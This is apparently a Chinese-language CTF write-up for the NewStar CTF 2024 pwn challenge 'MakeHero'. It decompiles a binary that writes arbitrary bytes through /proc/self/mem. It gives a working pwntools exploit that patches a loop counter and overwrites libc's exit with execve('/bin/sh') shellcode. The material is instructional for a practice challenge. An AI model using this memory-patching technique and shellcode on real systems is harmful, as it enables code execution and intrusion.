---
titleTemplate: ':title | WriteUp - NewStar CTF 2024'
---

# MakeHero

## 逆向分析

固定步骤，拖入 IDA 分析

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  unsigned __int8 v4; // [rsp+3h] [rbp-8Dh] BYREF
  int v5; // [rsp+4h] [rbp-8Ch]
  unsigned __int64 v6; // [rsp+8h] [rbp-88h] BYREF
  char v7[120]; // [rsp+10h] [rbp-80h] BYREF
  unsigned __int64 v8; // [rsp+88h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  sub_1430(a1, a2, a3);
  v5 = 2;
  puts("Welcome to NewStarCTF week4!");
  puts(aEek4);
  printf(asc_20F8);
  __isoc99_scanf("%100s", v7);
  printf(aS, v7);
  puts(asc_2158);
  while ( 1 )
  {
    if ( !v5-- )
    {
      puts(asc_2270);
      sleep(3u);
      printf(asc_22B1, v7);
      exit(0);
    }
    printf(asc_217F);
    puts(asc_2198);
    if ( (unsigned int)__isoc99_scanf("%lx %hhx", &v6, &v4) != 2 )
    {
      puts(asc_2208);
      puts(asc_2233);
      exit(-1);
    }
    if ( v5 == 1 )
    {
      if ( v6 < qword_4060 || v6 >= qword_4068 )
        goto LABEL_7;
LABEL_11:
      sub_1369(v6, v4);
    }
    else
    {
      if ( v6 >= qword_4050 && v6 < qword_4058 )
        goto LABEL_11;
LABEL_7:
      puts(aOhNo);
    }
  }
}
```

```c
int __fastcall sub_1369(__off_t a1, char a2)
{
  char buf[4]; // [rsp+4h] [rbp-1Ch] BYREF
  __off_t offset; // [rsp+8h] [rbp-18h]
  int fd; // [rsp+1Ch] [rbp-4h]

  offset = a1;
  buf[0] = a2;
  fd = open("/proc/self/mem", 2);
  if ( fd == -1 )
  {
    perror("open /proc/self/mem");
    exit(1);
  }
  if ( lseek(fd, offset, 0) == -1 )
  {
    perror("lseek");
    close(fd);
    exit(1);
  }
  if ( write(fd, buf, 1uLL) != 1 )
    perror("write");
  return close(fd);
}
```

可知，程序实现了通过 `/proc/self/mem` 实现了任意地址的改写

:::tip
程序是通过 `open("/proc/self/mem")` 的方式实现改写，因此无视各地址段的读写权限
:::

![读入](/assets/images/wp/2024/week4/makehero_1.png)

程序读入两个数字，`%lx` 是地址，`%hhx` 是要改的字节

![限制输入范围](/assets/images/wp/2024/week4/makehero_2.png)

其中，程序对 `v6` 的取值做了限制

在 `sub_1430` 函数中，对这几个全局变量做了初始化

![全局变量初始化](/assets/images/wp/2024/week4/makehero_3.png)

结合 gdb 动调时的地址分布，我们可知，`qword_4060` 和 `qword_4068` 是程序 ELF `的地址，qword_4050` 和 `qword_4058` 是程序 libc 的地址

## Pwn it

程序能任意写两次，第一次能改写 ELF，第二次能改写 libc，仅有的两次机会是不足以让我们拿到 flag 的，我们需要通过仅有的两次机会来让我们获得「无限次」的机会

分析发现，程序的退出点在这里

![程序的退出点](/assets/images/wp/2024/week4/makehero_4.png)

因此我们能否通过修改跳转条件或是其他，来让程序不执行退出呢

![修改跳转条件](/assets/images/wp/2024/week4/makehero_5.png)

我们或许可以通过改 jnz 为其他条件跳转来实现一直执行，也可以让 `v5--` 变为 `v5++` 来实现「无限次」任意写

![修改 v5](/assets/images/wp/2024/week4/makehero_6.png)

在这，我选择修改 `--` 为 `++`，就是将 `8D 50 FF` 改为 `8D 50 01`

![修改 v5](/assets/images/wp/2024/week4/makehero_7.png)

改完后，我们能一直任意写，剩下的就很多种解法了

我选择将 exit 处代码改为 shellcode，来 GetShell

```python
#!/usr/bin/env python3
from pwn import *

context(log_level='debug', arch='amd64', os='linux')
context.terminal = ["tmux", "splitw", "-h"]
uu64 = lambda x: u64(x.ljust(8, b'\x00'))
s = lambda x: p.send(x)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)
r = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)

p = process('./MakeHero')
libc = ELF("./libc.so.6")

def u8_ex(data) -> int:
    assert isinstance(data, (str, bytes)), "wrong data type!"
    length = len(data)
    assert length <= 1, "len(data) > 1!"
    if isinstance(data, str):
        data = data.encode('latin-1')
    data = data.ljust(1, b"\x00")
    return unpack(data, 8)

def write_mem(addr, byte):
    if isinstance(byte, bytes):
        sla(b'\x89\xef\xbc\x81', hex(addr) + ' ' + hex(u8_ex(byte)))
    elif isinstance(byte, int):
        sla(b'\x89\xef\xbc\x81', hex(addr) + ' ' + hex(byte))

def write_code(addr, code):
    for i in range(len(code)):
        write_mem(addr + i, code[i])

ru(b'** ')
code_base = int(p.recvuntil(b' -', drop=True), 16)

ru(b'## ')
libc_base = int(p.recvuntil(b' -', drop=True), 16)

sl(b'inkey')

write_mem(code_base + 0x1877, 0x1)
write_mem(libc_base + libc.sym.exit + 4, b'\x90')
write_mem(code_base + 0x1877, 0x1)
write_code(libc_base + libc.sym.exit + 5, b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")
sl(b'bye')

p.interactive()
```

这题既能改 ELF，也能改 libc，应该会有很多不一样的解法吧（
